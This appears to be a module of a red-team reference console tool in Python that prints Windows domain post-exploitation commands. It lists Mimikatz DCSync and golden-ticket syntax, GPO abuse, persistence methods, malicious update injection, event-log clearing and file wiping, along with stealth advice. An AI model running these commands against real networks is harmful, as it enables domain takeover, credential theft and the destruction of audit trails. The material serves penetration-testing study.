"""Consolidation & Dominance Module"""

from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.console import Console


class ConsolidationModule:
    """Module for consolidation and strategic objectives"""
    
    def run(self, console: Console, session_data: dict):
        """Run consolidation module"""
        while True:
            console.print(Panel(
                "[bold]Consolidation & Dominance[/bold]\n\n"
                "Strategic objectives, persistence, and environment-wide control.",
                title="Module 5",
                border_style="cyan"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            table.add_row("1", "Strategic Objectives")
            table.add_row("2", "Domain Controller Access")
            table.add_row("3", "Persistence Mechanisms")
            table.add_row("4", "Central Control Planes")
            table.add_row("5", "Clean-up Considerations")
            table.add_row("0", "Return to main menu")
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5'], default='0')
            
            if choice == '0':
                break
            elif choice == '1':
                self._strategic_objectives(console, session_data)
            elif choice == '2':
                self._domain_controller(console, session_data)
            elif choice == '3':
                self._persistence(console, session_data)
            elif choice == '4':
                self._control_planes(console, session_data)
            elif choice == '5':
                self._cleanup(console, session_data)
            
            console.print()
    
    def _strategic_objectives(self, console: Console, session_data: dict):
        """Strategic objectives"""
        console.print("\n[bold cyan]Strategic Objectives[/bold cyan]\n")
        
        console.print("[bold]High-Value Targets:[/bold]")
        targets = {
            "Domain Controllers": [
                "Directory manipulation",
                "Group Policy modification",
                "Credential extraction (DCSync)",
                "Golden ticket creation"
            ],
            "PKI Servers": [
                "Certificate authority compromise",
                "Certificate theft/forgery",
                "Code signing certificate access"
            ],
            "Backup/DR Systems": [
                "Backup credential access",
                "Restore malicious configurations",
                "Backup data exfiltration"
            ],
            "Deployment Pipelines": [
                "CI/CD compromise",
                "Software deployment control",
                "Malicious update injection"
            ],
            "Management Systems": [
                "SCCM compromise",
                "WSUS manipulation",
                "Monitoring system control"
            ]
        }
        
        for target, methods in targets.items():
            console.print(f"[bold]{target}:[/bold]")
            for method in methods:
                console.print(f"  • {method}")
            console.print()
        
        console.print("[bold]Transition Point:[/bold]")
        console.print("  When lateral movement transitions to environment-wide control:")
        console.print("  • Directory and group policies can be manipulated")
        console.print("  • Deployment tools can push software across estate")
        console.print("  • Credential/PKI infrastructure can be influenced")
    
    def _domain_controller(self, console: Console, session_data: dict):
        """Domain controller access and manipulation"""
        console.print("\n[bold cyan]Domain Controller Access[/bold cyan]\n")
        
        console.print("[bold]DC Enumeration:[/bold]")
        enum_cmds = [
            "nltest /dclist:<domain>",
            "[PowerShell] Get-ADDomainController",
            "[PowerShell] Get-ADForest | Select-Object DomainControllers",
            "net group \"Domain Controllers\" /domain"
        ]
        
        for cmd in enum_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]DCSync Attack:[/bold]")
        dcsync_cmds = [
            "Mimikatz: lsadump::dcsync /user:<user>",
            "Mimikatz: lsadump::dcsync /user:krbtgt",
            "Mimikatz: lsadump::dcsync /all",
            "[PowerShell] Invoke-DCSync -Paged",
            "Requires: Replicating Directory Changes, Replicating Directory Changes All"
        ]
        
        for cmd in dcsync_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Golden Ticket:[/bold]")
        golden_ticket = [
            "Mimikatz: kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<hash> /id:500 /ptt",
            "Rubeus: golden /krbtgt:<hash> /domain:<domain> /user:<user>",
            "Creates TGT that bypasses KDC validation",
            "Valid until krbtgt password changes"
        ]
        
        for cmd in golden_ticket:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Group Policy Manipulation:[/bold]")
        gpo_cmds = [
            "[PowerShell] Get-GPO -All",
            "[PowerShell] Get-GPOReport -All -ReportType Html",
            "[PowerShell] New-GPO -Name <name>",
            "[PowerShell] Set-GPRegistryValue -Name <GPO> -Key <key> -ValueName <value> -Value <data>",
            "GPO files: \\\\<domain>\\SYSVOL\\<domain>\\Policies\\"
        ]
        
        for cmd in gpo_cmds:
            console.print(f"  • {cmd}")
    
    def _persistence(self, console: Console, session_data: dict):
        """Persistence mechanisms"""
        console.print("\n[bold cyan]Persistence Mechanisms[/bold cyan]\n")
        
        persistence_methods = {
            "Scheduled Tasks": [
                "schtasks /create /tn <task> /tr \"<command>\" /sc onlogon",
                "schtasks /create /tn <task> /tr \"<command>\" /sc daily /st <time>",
                "[PowerShell] Register-ScheduledTask -TaskName <name> -Action <action> -Trigger <trigger>",
                "Location: C:\\Windows\\System32\\Tasks\\"
            ],
            "Windows Services": [
                "sc create <service> binPath= \"<command>\" start= auto",
                "sc config <service> start= auto",
                "sc start <service>",
                "[PowerShell] New-Service -Name <name> -BinaryPathName <path>"
            ],
            "Startup Items": [
                "Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "Registry: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "Startup folder: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                "Startup folder: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
            ],
            "WMI Event Subscriptions": [
                "[PowerShell] Create WMI event filter",
                "[PowerShell] Create WMI event consumer",
                "[PowerShell] Bind filter to consumer",
                "Survives reboots, less visible"
            ],
            "COM Hijacking": [
                "Hijack COM object loading",
                "Place malicious DLL in COM object path",
                "Registry: HKLM\\Software\\Classes\\CLSID\\{<guid>}\\InprocServer32"
            ],
            "GPO-based Persistence": [
                "Modify Group Policy to execute scripts",
                "GPO startup/shutdown scripts",
                "GPO scheduled tasks",
                "Affects entire domain/OU"
            ]
        }
        
        for method, commands in persistence_methods.items():
            console.print(f"[bold]{method}:[/bold]")
            for cmd in commands:
                console.print(f"  • {cmd}")
            console.print()
        
        console.print("[bold]OPSEC Considerations:[/bold]")
        console.print("  • Prefer persistence on management boxes")
        console.print("  • Use names that resemble legitimate services")
        console.print("  • Avoid excessive modification of endpoints")
        console.print("  • Prefer controlling central control planes")
    
    def _control_planes(self, console: Console, session_data: dict):
        """Central control planes"""
        console.print("\n[bold cyan]Central Control Planes[/bold cyan]\n")
        
        control_planes = {
            "Active Directory": [
                "Group Policy Objects",
                "OU structure",
                "User/computer accounts",
                "Delegation and trusts"
            ],
            "SCCM (System Center)": [
                "Software deployment",
                "Configuration management",
                "Remote control",
                "Client push installation"
            ],
            "WSUS (Windows Update)": [
                "Update deployment",
                "Update approval",
                "Malicious update injection"
            ],
            "Backup Systems": [
                "Veeam, Backup Exec, DPM",
                "Backup credential storage",
                "Restore capabilities",
                "Backup data access"
            ],
            "Monitoring Systems": [
                "SCOM, Nagios, Zabbix",
                "Alert suppression",
                "Agent deployment",
                "Configuration access"
            ],
            "Deployment Pipelines": [
                "CI/CD systems",
                "Build servers",
                "Package repositories",
                "Automated deployment"
            ]
        }
        
        for plane, capabilities in control_planes.items():
            console.print(f"[bold]{plane}:[/bold]")
            for cap in capabilities:
                console.print(f"  • {cap}")
            console.print()
        
        console.print("[bold]Strategy:[/bold]")
        console.print("  • Control central systems rather than individual endpoints")
        console.print("  • Leverage existing automation and deployment")
        console.print("  • Blend into normal administrative patterns")
    
    def _cleanup(self, console: Console, session_data: dict):
        """Clean-up considerations"""
        console.print("\n[bold cyan]Clean-up Considerations[/bold cyan]\n")
        
        console.print("[bold]Artifact Removal:[/bold]")
        cleanup_items = [
            "Temporary files and scripts",
            "Service accounts created for lateral movement",
            "Scheduled tasks used for execution",
            "Event log entries (if possible)",
            "Network connections and sessions"
        ]
        
        for item in cleanup_items:
            console.print(f"  • {item}")
        
        console.print("\n[bold]Event Log Manipulation:[/bold]")
        log_cmds = [
            "wevtutil cl <log_name>",
            "[PowerShell] Clear-EventLog -LogName <log>",
            "[PowerShell] Remove-EventLog -LogName <log>",
            "Requires appropriate permissions"
        ]
        
        for cmd in log_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]File Cleanup:[/bold]")
        file_cmds = [
            "del /f /s /q <file>",
            "[PowerShell] Remove-Item -Path <path> -Recurse -Force",
            "sdelete.exe <file> (secure delete)",
            "cipher /w:<drive> (wipe free space)"
        ]
        
        for cmd in file_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]OPSEC Best Practices:[/bold]")
        practices = [
            "Minimize artifacts from the start",
            "Use built-in Windows mechanisms",
            "Prefer in-memory execution",
            "Clean up immediately after operations",
            "Avoid leaving persistent backdoors on many endpoints"
        ]
        
        for practice in practices:
            console.print(f"  • {practice}")
